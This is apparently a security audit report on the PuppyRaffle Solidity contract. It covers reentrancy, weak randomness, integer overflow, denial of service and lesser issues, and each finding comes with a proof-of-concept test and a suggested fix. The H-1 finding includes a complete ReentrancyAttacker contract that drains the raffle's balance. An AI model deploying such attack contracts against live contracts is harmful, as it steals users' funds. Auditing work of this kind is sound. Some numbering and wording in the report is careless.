

# High

### [H-1] Reentrancy attack in `PuppyRaffle:refund` allow entrant to drain raffle balance 


**Description:** The `PuppyRaffle:refund` function does not follow CEI pattern and as a result , enable participants to drain the contract balance .

In the `PuppyRaffle::refund` function , we first make an external call to the `msg.sender` address and only after making that external call do we update the puppy raffle player's array . 

```javascript
       function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
@>      payable(msg.sender).sendValue(entranceFee);
@>      players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);
    }

```

A player who has entered the raffle could have a fallback function that calls the `PuppyRaffle:refund` function , and then re-enters the raffle , draining the contract balance.


**Impact:** All fees collected by the raffle could be drained by a malicious participant.

**Proof of Concept:** 

1. Users enter the raffle
2. Attackers sets up the contract with a fallback function that calls `PuppyRaffle:refund` and then re-enters the raffle
3. Attack enters the raffle 
4. Attack calls the fallback function , draining the contract balance

**Proof of Code**

<details>
<summary>
Code
</summary>

Place the following into a file called `PuppyRaffle.sol`:


```javascript

        function test_retrancyRefund() public {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
        address attackUser = makeAddr("attackUser");
        vm.deal(attackUser , 1 ether);

        uint256 startingAttackContractBalance = address(attackerContract).balance;
        uint256 startingContractBalance = address(puppyRaffle).balance;

        vm.prank(attackUser);
        attackerContract.attack{value: entranceFee}();

        console.log("startingAttackContractBalance", startingAttackContractBalance);
        console.log("startingContractBalance", startingContractBalance);

        console.log("ending attacker contract balance" , address(attackerContract).balance);
        console.log("ending contract balance" , address(puppyRaffle).balance);
    }

```

And this contract as well . 

```javascript

contract ReentrancyAttacker{

    PuppyRaffle puppyRaffle;
    uint256 entranceFee ;
    uint256 attackerIndex ;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable{
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);

        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    function _stealMoney() internal {
        if( address(puppyRaffle).balance >= entranceFee){
            puppyRaffle.refund(attackerIndex);
        }
    }

    fallback() external payable{
        _stealMoney();
    }

    receive() external payable{
        _stealMoney();
    }
}

```     

</details>



**Recommended Mitigation:**
To prevent this , we should have the `PuppyRaffle:refund` function update the `players` array before making the external call . Additionally , we should move the event emission up as well . 

```diff


    function refund(uint256 playerIndex) public {
        
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+       players[playerIndex] = address(0); 
+       emit RaffleRefunded(playerAddress);
        payable(msg.sender).sendValue(entranceFee);
-       players[playerIndex] = address(0); 
-       emit RaffleRefunded(playerAddress);
    }



```


### [H-2] Weak randomness in `PuppyRaffle:selectWinner` allows miner to influence the outcome of the raffle and influence and predict the winning puppy

**Description:** Hashing `msg.sender`, `block.timestamp`, and `block.difficulty` together creates a predictable find number . A predictable number is not a good random number . Malicious users can manipulate these values or know them ahead of time to choose the winner of the raffle themselves.

*Note:* This additionally means users could front-run this function and call `refund` if they see they are not winner . 

**Impact:** 
Any user can manipulate the outcome of the raffle , or front-run the function to get a refund if they are not the winner and select the rarest puppy. Making the entire raffle worthless if it becomes a gas war.

**Proof of Concept:**

1. Validators can know ahead of time the `block.timestamp` and `block.difficulty` and use that to predict when/how to participate in the raffle. See the [solidity blog on prevrandao](https://soliditydeveloper.com/prevrandao). `block.dfficulty` was recently replaced with prevrandao.
2. User can mine/manipulalte thier `msg.sender` value to result in thier address being used to generated the winner.
3. User can revert their `selectWinner` transaction it they dont like the winner or result puppy. 

Using on-chain values as randomness seed is a [well-documented](https://ethereum.stackexchange.com/questions/191/how-can-i-securely-generate-a-random-number-in-my-smart-contract) bad practice in the blockchain space . 


**Recommended Mitigation:**
COnsider using the cryptographically provable random number generator (RNG) such a Chainlink VRF or Provable's RNG.


### [H-3] Integer over flow `PuppyRaffle:totalFees` loses fees 

**Description:** In the solidity bersion to `0.8.0` integers were subject to integer overflows.

```javascript

uint64 myVar = type(uint64).max;
myVar = myVar + 1;
//myVar will be 0
```

**Impact:** In `PuppyRaffle:selectWinner` , `totalFees` are accumulated for the `feeAddress` to collect later in `PuppyRaffle::withdrawFees` . If the `totalFees` overflows , the `feeAddress` will not be able to collect the fees. leaving fees permanently locked in the contract.

**Proof of Concept:** 
1. We first conclude a raffle of 4 players to collect some fees.
2. We then have 89 additional players enter a new raffle, and we conclude that raffle as well.
3. `totalFees` will be:
```javascript
totalFees = totalFees + uint64(fee);
// substituted
totalFees = 800000000000000000 + 17800000000000000000;
// due to overflow, the following is now the case
totalFees = 153255926290448384;
```
4. You will now not be able to withdraw, due to this line in `PuppyRaffle::withdrawFees`:
```javascript
require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
```

Although you could use `selfdestruct` to send ETH to this contract in order for the values to match and withdraw the fees, this is clearly not what the protocol is intended to do. 

<details>
<summary>Proof of Code </summary>

```javascript
function testTotalFeesOverflow() public playersEntered {
        // We finish a raffle of 4 to collect some fees
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        puppyRaffle.selectWinner();
        uint256 startingTotalFees = puppyRaffle.totalFees();
        // startingTotalFees = 800000000000000000

        // We then have 89 players enter a new raffle
        uint256 playersNum = 89;
        address[] memory players = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            players[i] = address(i);
        }
        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
        // We end the raffle
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        // And here is where the issue occurs
        // We will now have fewer fees even though we just finished a second raffle
        puppyRaffle.selectWinner();
                uint256 endingTotalFees = puppyRaffle.totalFees();
        console.log("ending total fees", endingTotalFees);
        assert(endingTotalFees < startingTotalFees);

        // We are also unable to withdraw any fees because of the require check
        vm.prank(puppyRaffle.feeAddress());
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }


```
</details>

**Recommended Mitigation:** There are a few recommended mitigations here.

1. Use a newer version of Solidity that does not allow integer overflows by default.

```diff 
- pragma solidity ^0.7.6;
+ pragma solidity ^0.8.18;
```

Alternatively, if you want to use an older version of Solidity, you can use a library like OpenZeppelin's `SafeMath` to prevent integer overflows. 

2. Use a `uint256` instead of a `uint64` for `totalFees`. 

```diff
- uint64 public totalFees = 0;
+ uint256 public totalFees = 0;
```

3. Remove the balance check in `PuppyRaffle::withdrawFees` 

```diff
- require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
```

We additionally want to bring your attention to another attack vector as a result of this line in a future finding.


# Medium

### [M-1] Looping through players array to check for duplicated in `PuppuRaffle:enterRaffle` is a potential denial of service (DoS) attack , incrementing gas costs for future entrants.

**Description:**
The `PuppyRaffle:enterRaffle` function loops through the `players` array to check for duplicates. This is a potential denial of service (DoS) attack, as the gas costs for future entrants will increase as the array grows. This means that the gas costs for future entrants will increase as the array grows.

```javascript

@> for (uint256 i = 0; i < players.length - 1; i++) {
            for (uint256 j = i + 1; j < players.length; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
    } 

```


**Impact:** 
The gas costs for future entrants will increase as the array grows. Discouraginf later users from entering the raffle.

An attacker might make the `PuppyRaffle:entrants` array grow to a size that makes it impossible for future entrants to enter the raffle.

**Proof of Concept:**

If we have 2 sets of 100 player enter , the gas costs will be as such :

-- 1st 100 players : 6252048
-- 2nd 100 players : 18068138

This more than 3 times the gas costs for the 1st 100 players.

<details>
<summary>PoC</summary>

```javascript
       function test_denialOfService() public {
        vm.txGasPrice(1);
        uint256 playersNum = 100;
        address[] memory players = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            players[i] = address(i);
        }
        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee*players.length}(players);
        uint256 gasEnd = gasleft();
        uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;
        console.log("gasUsedFirst", gasUsedFirst);

        // now for 2nd 100 players
        address[] memory playersTwo = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            playersTwo[i] = address(i + playersNum);
        }
        uint256 gasStartSecond = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee*players.length}(playersTwo);
        uint256 gasEndSecond = gasleft();
        uint256 gasUsedSecond = (gasStartSecond - gasEndSecond) * tx.gasprice;
        console.log("gasUsedSecond", gasUsedSecond);

        assert(gasUsedFirst < gasUsedSecond);

    }
```
</details>


**Recommended Mitigation:**
There are a fix recommandations to mitigate this issue:
1. Consider allowing duplicated . Users can make new wallet address anyways , so a duplicate check doesnt prevent users from entering multiple times.
2. Consider using a mapping to check for duplicated . This would allow constant time lookup of whether a user has already entered the raffle.

```diff
+    mapping(address => uint256) public addressToRaffleId;
+    uint256 public raffleId = 0;
    .
    .
    .
    function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
+            addressToRaffleId[newPlayers[i]] = raffleId;            
        }

-        // Check for duplicates
+       // Check for duplicates only from the new players
+       for (uint256 i = 0; i < newPlayers.length; i++) {
+          require(addressToRaffleId[newPlayers[i]] != raffleId, "PuppyRaffle: Duplicate player");
+       }    
-        for (uint256 i = 0; i < players.length; i++) {
-            for (uint256 j = i + 1; j < players.length; j++) {
-                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-            }
-        }
        emit RaffleEnter(newPlayers);
    }
.
.
.
    function selectWinner() external {
+       raffleId = raffleId + 1;
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
```

Alternatively, you could use [OpenZeppelin's `EnumerableSet` library](https://docs.openzeppelin.com/contracts/4.x/api/utils#EnumerableSet).

### [M-2] Unsafe cast of `PuppyRaffle::fee` loses fees

**Description:** In `PuppyRaffle::selectWinner` their is a type cast of a `uint256` to a `uint64`. This is an unsafe cast, and if the `uint256` is larger than `type(uint64).max`, the value will be truncated. 

```javascript
    function selectWinner() external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length > 0, "PuppyRaffle: No players in raffle");

        uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
        address winner = players[winnerIndex];
        uint256 fee = totalFees / 10;
        uint256 winnings = address(this).balance - fee;
@>      totalFees = totalFees + uint64(fee);
        players = new address[](0);
        emit RaffleWinner(winner, winnings);
    }
```

The max value of a `uint64` is `18446744073709551615`. In terms of ETH, this is only ~`18` ETH. Meaning, if more than 18ETH of fees are collected, the `fee` casting will truncate the value. 

**Impact:** This means the `feeAddress` will not collect the correct amount of fees, leaving fees permanently stuck in the contract.

**Proof of Concept:** 

1. A raffle proceeds with a little more than 18 ETH worth of fees collected
2. The line that casts the `fee` as a `uint64` hits
3. `totalFees` is incorrectly updated with a lower amount

You can replicate this in foundry's chisel by running the following:

```javascript
uint256 max = type(uint64).max
uint256 fee = max + 1
uint64(fee)
// prints 0
```

**Recommended Mitigation:** Set `PuppyRaffle::totalFees` to a `uint256` instead of a `uint64`, and remove the casting. Their is a comment which says:

```javascript
// We do some storage packing to save gas
```
But the potential gas saved isn't worth it if we have to recast and this bug exists. 

```diff
-   uint64 public totalFees = 0;
+   uint256 public totalFees = 0;
.
.
.
    function selectWinner() external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
        uint256 winnerIndex =
            uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
        address winner = players[winnerIndex];
        uint256 totalAmountCollected = players.length * entranceFee;
        uint256 prizePool = (totalAmountCollected * 80) / 100;
        uint256 fee = (totalAmountCollected * 20) / 100;
-       totalFees = totalFees + uint64(fee);
+       totalFees = totalFees + fee;

```


### [M-2] Smart Contract wallet raffle winners without a `receive` or a `fallback` will block the start of a new contest

**Description:** The `PuppyRaffle::selectWinner` function is responsible for resetting the lottery. However, if the winner is a smart contract wallet that rejects payment, the lottery would not be able to restart. 

Non-smart contract wallet users could reenter, but it might cost them a lot of gas due to the duplicate check.

**Impact:** The `PuppyRaffle::selectWinner` function could revert many times, and make it very difficult to reset the lottery, preventing a new one from starting. 

Also, true winners would not be able to get paid out, and someone else would win their money!

**Proof of Concept:** 
1. 10 smart contract wallets enter the lottery without a fallback or receive function.
2. The lottery ends
3. The `selectWinner` function wouldn't work, even though the lottery is over!

**Recommended Mitigation:** There are a few options to mitigate this issue.

1. Do not allow smart contract wallet entrants (not recommended)
2. Create a mapping of addresses -> payout so winners can pull their funds out themselves with a new `claimPrize`, putting the owness on the winner to claim their prize. (Recommended) . 

> Pull over push



# Low

### [L-1] `PuppyRaffle:getActivePlayerIndex` return 0 for non-existent players at index 0 , causing a player at index 0 to incorrectly think they havve not entered the raffle . 

**Description:** If a player is in the `PuppyRaffle::players` array at index 0 , and they call `PuppyRaffle:getActivePlayerIndex` with their address , the function will return 0 , causing the player to think they have not entered the raffle .

```javascript

    function getActivePlayerIndex(address player) external view returns (uint256) {
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == player) {
                return i;
            }
        }
        return 0;
    }

```

**Impact:** A player at index 0 may incorrectly think they have not entered the raffle , and attampt to enter the raffle again , causing them to lose their entrance fee.

**Proof of Concept:**

1. User enters the raffle , they are the first player in the `PuppyRaffle::players` array
2. `PuppyRaffle::getActivePlayerIndex` returns 0 
3. User thinks they have not entered the raffle , and attempts to enter again , losing their entrance fee

**Recommended Mitigation:**
The easiest recommendation would be to revert if the player is not in the array instead of returning 0 .

You could also reserve the 0th position for any competition but a better solution to return an `int256` where the function returns -1 if the player is not active . 


# Gas

### [G-1] : Unchanged state variable should be declared constant

Reading from storage is much more expensive than reading from constant or immutable variable . 

Instances:
- `PuppyRaffle::raffleDuration` should be `immutable`
- `PuppyRaffle::commonImageUri` should be `constant`
- `PuppyRaffle::rareImageUri` should be `constant`
- `PuppyRaffle::legendaryImageUri` should be `constant`

### [G-2] : Storage Variable in a lopp should be cached

Everytime you call `players.length` you read from storage, opposed to memory which is more gas efficient. Consider caching the value in a local variable.



```diff
+       uint256 playerLength = player.length;
-       for (uint256 i = 0; i < players.length - 1; i++) {
+       for (uint256 i = 0; i < playerLength - 1; i++) {
-           for (uint256 j = i + 1; j < players.length; j++) {
+                for (uint256 j = i + 1; j < playerLength; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        } 

```

# Informational 

### [I-1] : Solidity pragma should be specific, not wide

Consider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma solidity ^0.8.0;`, use `pragma solidity 0.8.0;`

- Found in src/PuppyRaffle.sol [Line: 2](src/PuppyRaffle.sol#L2)

	```solidity
	pragma solidity ^0.7.6;
	```

### [I-2] : Using an outdated version of Solidity is not recommended .

olc frequently releases new compiler versions. Using an old version prevents access to new Solidity security checks. We also recommend avoiding complex pragma statement.

Recommendation
Deploy with any of the following Solidity versions:

`0.8.18`
The recommendations take into account:

Risks related to recent releases
Risks of complex code generation changes
Risks of new language features
Risks of known bugs
Use a simple pragma version that allows any of these versions. Consider using the latest version of Solidity for testing.

Please see [slither](https://github.com/crytic/slither/wiki/Detector-Documentation#state-variables-that-could-be-declared-immutable) documentation for more information.



### [I-3] : Missing checks for `address(0)` when assigning values to address state variables

Assigning values to address state variables without checking for `address(0)`.

- Found in src/PuppyRaffle.sol [Line: 63](src/PuppyRaffle.sol#L63)

	```solidity
	        feeAddress = _feeAddress;
	```

- Found in src/PuppyRaffle.sol [Line: 175](src/PuppyRaffle.sol#L175)

	```solidity
	        previousWinner = winner;
	```

- Found in src/PuppyRaffle.sol [Line: 198](src/PuppyRaffle.sol#L198)

	```solidity
	        feeAddress = newFeeAddress;
	```

### [I-4] : `PuppyRaffle::selectWinner` does not follow CEI, which is not a best practice . 

Its best to keep code clean and follow CEI(Checks , Effects , Interactions) pattern .

```diff

-        (bool success,) = winner.call{value: prizePool}("");
-        require(success, "PuppyRaffle: Failed to send prize pool to winner");
        _safeMint(winner, tokenId);
+        (bool success,) = winner.call{value: prizePool}("");
+        require(success,"PuppyRaffle: Failed to send prize pool to winner");

```


### [I-5] : Use of "magic" numbers is discouraged

If can be confusing the see number literal in a codebase , and its much more readable if the numbers are given a name . 

Examples : 

```javascript

    uint256 prizePool = (totalAmountCollected * 80) / 100;
    uint256 fee = (totalAmountCollected * 20) / 100;

```

Instead , you could use  : 

```javascript

    uint256 public constant PRICE_POOL_PERCENTAGE = 80;
    uint256 public constant FEE_PERCENTAGE = 20;
    uint256 public constant TOTAL_PERCENTAGE = 100;

```

### [I-6]  : `PuppyRaffle::_isActivePlayer` is never used and should be removed

**Description:** The function `PuppyRaffle::_isActivePlayer` is never used and should be removed. 

```diff
-    function _isActivePlayer() internal view returns (bool) {
-        for (uint256 i = 0; i < players.length; i++) {
-            if (players[i] == msg.sender) {
-                return true;
-            }
-        }
-        return false;
-    }
```


